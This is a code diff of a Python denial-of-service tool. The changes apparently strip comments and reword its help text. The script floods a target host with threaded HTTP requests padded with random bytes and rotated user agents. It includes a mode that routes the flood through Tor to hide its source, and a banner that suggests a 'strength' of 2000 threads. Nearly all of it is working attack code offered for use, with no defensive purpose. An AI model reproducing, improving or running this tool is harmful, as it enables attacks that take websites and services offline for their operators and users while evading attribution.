@@ -1,5 +1,3 @@
-
-# IMPORT ALL MODULE NEEDED
 import socket
 import random
 import time
@@ -13,7 +11,7 @@ from base64 import *
 
 start = time.time()
 try:
-	import socks # PySocks
+	import socks 
 	havetor = True
 except ModuleNotFoundError:
 	print("[!] PySocks Not Installed, Tor Option Not Available")
@@ -21,14 +19,14 @@ except ModuleNotFoundError:
 
 
 
-# CALCULATING BYTE TO READABLE 
+ 
 def humansize(num, suffix='B'):
     for unit in ['','Ki','Mi','Gi','Ti','Pi','Ei','Zi']:
         if abs(num) < 1024.0:
             return "%3.1f%s%s" % (num, unit, suffix)
         num /= 1024.0
     return "%.1f%s%s" % (num, 'Yi', suffix)
-# COLOR GANG
+
 class color:
 	NOCOLOR='\033[0m'
 	RED='\033[0;31m'
@@ -48,7 +46,7 @@ class color:
 	WHITE='\033[1;37m'
 
 
-# USER AGENT GANG
+
 sig = b64decode
 def uagent():
 	userAgent = []
@@ -68,19 +66,19 @@ def keyboardInterruptHandler(signal, frame):
     print("KeyboardInterrupt (ID: {}) has been caught. Cleaning up...".format(signal))
     exit(0)
 
-# CREATE A DATA
+
 
 def createData(url,metode):
 	data = f'{metode} / HTTP/1.1\r\nHost: {url}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: {uagent()}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\ndnt: 1\r\nX-Requested-With: curl\r\nSec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nReferer: http://{url}/\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\r\n\r\n'+str(os.urandom(random.randint(1,8192)))
 	return data.encode()
 
-# SOME VARIABLE
+
 ld = 10
 anim = "|/—\\".replace(""," ").split()
 failed = []
 working = []
 
-# BOT FOR NORMAL USE, WITHOUT TOR
+
 def dosBot(url,port,i,tunda,metode):
 	global ts 
 	ts = 0
@@ -120,7 +118,7 @@ def dosBot(url,port,i,tunda,metode):
 			size = size + sizeData*4
 		
 
-# BOT FOR TOR MODE
+
 def torBot(url,port,i,torrip,torport,tunda,metode):
 	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(torrip), int(torport), True)
 
@@ -169,14 +167,14 @@ def torBot(url,port,i,torrip,torport,tunda,metode):
 
 
 
-# START ATTACK, NORMAL MODE
+
 def run(url,port,thread,tunda,metode):
 	for i in range(thread):
 		print(f"[Info] Starting All Thread                                    ")
 		t = threading.Thread(target=dosBot,args=(url,port,i,tunda,metode))
 		t.start()
 
-# START ATTACK, TOR MODE
+
 def runTor(url,port,thread,toraddr,torport,tunda,metode):
 	for i in range(thread):
 		print(f"[Info] Starting All Thread                                    ")
@@ -188,7 +186,6 @@ args = sys.argv
 
 print(" ")
 print ('''
-
    ***
   ** **
  **   **
@@ -211,17 +208,16 @@ print ('''
 +-------------------------+
 | I Suggest Strength 2000 |
 +-------------------------+ ''')
-print(" ")
 
 
-# MANAGE ARGUMENTS
-parser = argparse.ArgumentParser(description="Ddos with Python3, Tor Network Supported")
+
+parser = argparse.ArgumentParser(description="Python Tor Network Supported Ddos")
 parser.add_argument ("-s","--target", help= "Target IP Address", type=str, dest='target', required=True )
 parser.add_argument ("-p","--port", help= "Port Of Target", type=str, dest='port', required=False,default=80)
 parser.add_argument ("-m","--method", help= "HTTP Method", type=str, dest='method', required=False ,default="POST")
 parser.add_argument ("-t","--thread", help= "Threading", type=int, dest='thread', required=False ,default=50)
 print(" ")
-# CHECK IF PYSOCKS AVAILABLE
+
 if havetor == True:
 	parser.add_argument ("-o","--onion", help= "Attack Over Tor Network (Socks5), 127.0.0.1:9050", metavar="<host[:port]>",type=str, dest='tor', required=False)
 args = parser.parse_args()
@@ -239,7 +235,7 @@ if havetor == True:
 	print(tornet)
 if havetor == False:
 	tornet = None
-# START PROCESS, TOR MODE
+
 if tornet or "--onion" in sys.argv or "-o" in sys.argv:
 	toraddr, torport = "127.0.0.1", 9050
 	toraddr, torport= tornet.split(":")
@@ -266,7 +262,7 @@ if tornet or "--onion" in sys.argv or "-o" in sys.argv:
 		sys.exit(1)
 
 
-# START PROCESS, NORMAL MODE
+
 if tornet == None:
 	print("[+] Target : "+str(target))
 	print("[+] Port : "+str(port))
